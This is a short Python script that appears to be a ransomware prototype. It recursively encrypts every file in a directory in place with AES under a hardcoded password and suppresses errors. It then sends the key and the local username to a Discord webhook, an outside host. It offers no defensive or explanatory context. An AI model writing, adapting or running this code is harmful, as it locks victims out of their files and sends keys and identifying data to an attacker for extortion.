import os
import hashlib
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_file(file_path, password):
    try:
        salt = get_random_bytes(AES.block_size)
    
        key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    
        with open(file_path, 'rb') as f:
            data = f.read()
    
        pad_len = AES.block_size - len(data) % AES.block_size
        data = data + pad_len * chr(pad_len).encode()
    
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
    
        encrypted_data = salt + iv + cipher.encrypt(data)
    
        with open(file_path, 'wb') as f:
            f.write(encrypted_data)
    except:
        pass

def encrypt_directory(dir_path, password):
    print('funny')
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, password)

def send_key_to_webhook(key, username):
    data = {
        'content': 'Encryption key: {}\nUsername: {}'.format(key, username)
    }
    requests.post('https://discordapp.com/api/webhooks/<webhook_id>/<webhook_token>', json=data)

if __name__ == '__main__':
    password = 'qwertyiop321654sheeilikemenbb3ksij4jgi4ew0fisjiogajlrs8o--_i3jt24'
    encrypt_directory('testing', password)

    username = os.environ.get('USERNAME') if 'nt' in os.name else os.environ.get('USER')
    send_key_to_webhook(password, username)
    print(password + ' ' + username)